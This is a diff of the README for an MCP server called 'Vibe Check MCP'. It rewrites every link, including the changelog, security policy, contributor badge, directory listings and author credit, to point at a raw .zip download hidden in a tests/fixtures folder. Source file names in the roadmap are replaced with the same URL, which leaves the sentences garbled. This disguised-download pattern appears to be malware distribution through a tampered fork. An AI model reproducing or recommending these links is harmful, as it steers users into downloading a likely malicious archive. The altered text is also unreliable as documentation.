+- [Advanced Integration](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+- [Technical Reference](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+- [Automatic Docker Setup](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+- [Philosophy](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+- [Case Studies](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+- [Changelog](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
 
 ## Security
-This repository includes a CI-based security scan that runs on every pull request. It checks dependencies with `npm audit` and scans the source for risky patterns. See [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip) for details and how to report issues.
+This repository includes a CI-based security scan that runs on every pull request. It checks dependencies with `npm audit` and scans the source for risky patterns. See [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip) for details and how to report issues.
 
 ## Roadmap (New PRs welcome)
 
@@ -299,36 +299,36 @@ This repository includes a CI-based security scan that runs on every pull reques
 - **Documentation refresh:** Highlight the new prompt template and context requirements throughout the README and integration guides.
 
 ### Priority 2 – Core Reliability Requests
-- **LLM resilience:** Wrap `generateResponse` in `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip` with retries and exponential backoff, with a follow-up circuit breaker once the basics land.
-- **Input sanitization:** Validate and cleanse tool arguments in `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip` to mitigate prompt-injection vectors.
-- **State stewardship:** Add TTL-based cleanup in `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip` and switch `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip` file writes to `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip` to avoid blocking the event loop.
+- **LLM resilience:** Wrap `generateResponse` in `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip` with retries and exponential backoff, with a follow-up circuit breaker once the basics land.
+- **Input sanitization:** Validate and cleanse tool arguments in `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip` to mitigate prompt-injection vectors.
+- **State stewardship:** Add TTL-based cleanup in `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip` and switch `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip` file writes to `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip` to avoid blocking the event loop.
 
 These initiatives are tracked as community-facing GitHub issues so contributors can grab them and see progress in the open.
 
 ### Additional Follow-On Ideas & Good First Issues
 - **Telemetry sanity checks:** Add a lint-style CI step that verifies `docs/` examples compile (e.g., TypeScript snippet type-check) to catch drift between docs and code.
 - **CLI help polish:** Ensure every CLI subcommand prints a concise `--help` example aligned with the refreshed prompt guidance.
-- **Docs navigation cleanup:** Cross-link `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip` and `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip` from the README section headers to reduce context switching for new contributors.
+- **Docs navigation cleanup:** Cross-link `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip` and `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip` from the README section headers to reduce context switching for new contributors.
 
 ## Contributors & Community
-Contributions are welcome! See [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip).
+Contributions are welcome! See [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip).
 
-<a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip">
-  <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip" alt="Contributors"/>
+<a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip">
+  <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip" alt="Contributors"/>
 </a> 
 
 ## Links
-* [MSEEP](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-* [MCP Servers](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-* [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-* [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-* [Pulse MCP](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-* [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-* [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-* [MCP Directory](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
+* [MSEEP](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+* [MCP Servers](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+* [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+* [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+* [Pulse MCP](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+* [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+* [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+* [MCP Directory](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
 
 ## Credits & License
 Vibe Check MCP is released under the [MIT License](LICENSE). Built for reliable, enterprise-ready AI agents.
 
 ## Author Credits & Links
-Vibe Check MCP created by: [Pruthvi Bhat](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip), Initiative - https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip
+Vibe Check MCP created by: [Pruthvi Bhat](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip), Initiative - https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip
